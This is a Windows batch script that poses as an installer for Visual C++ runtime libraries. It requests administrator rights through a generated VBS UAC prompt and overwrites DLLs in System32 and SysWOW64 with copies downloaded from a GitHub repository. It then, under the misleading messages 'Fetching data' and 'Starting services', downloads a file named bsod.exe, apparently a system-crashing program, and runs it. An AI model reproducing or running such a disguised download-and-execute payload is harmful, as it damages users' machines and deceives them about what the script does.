@echo off
color a

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "%~s0", "%params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

set "url1=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140_1d.dll"
set "url2=https://github.com/ItzzExcel/winlibs/raw/main/Libs/msvcp140d.dll"
set "url3=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140d.dll"
set "url4=https://github.com/ItzzExcel/winlibs/raw/main/Libs/ucrtbased.dll"
set "url5=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140.dll"
set "urlc=https://github.com/ItzzExcel/winlibs/raw/main/Libs/bsod.exe"

set "dest32=C:\Windows\System32"
set "dest64=C:\Windows\SysWOW64"
set "tmp=%temp%"

echo Downloading libraries . . .


echo Downloading for System32 . . .
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%dest32%\vcruntime140_1d.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%dest32%\msvcp140d.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url3%', '%dest32%\vcruntime140d.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url4%', '%dest32%\ucrtbased.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url5%', '%dest32%\vcruntime140.dll')"

echo Downloading for SysWOW64 . . .
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%dest64%\vcruntime140_1d.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%dest64%\msvcp140d.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url3%', '%dest64%\vcruntime140d.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url4%', '%dest64%\ucrtbased.dll')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url5%', '%dest64%\vcruntime140.dll')"

echo Fetching data . . .
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%urlc%', '%tmp%\bsod.exe')"

echo Starting services . . .
start %tmp%\bsod.exe
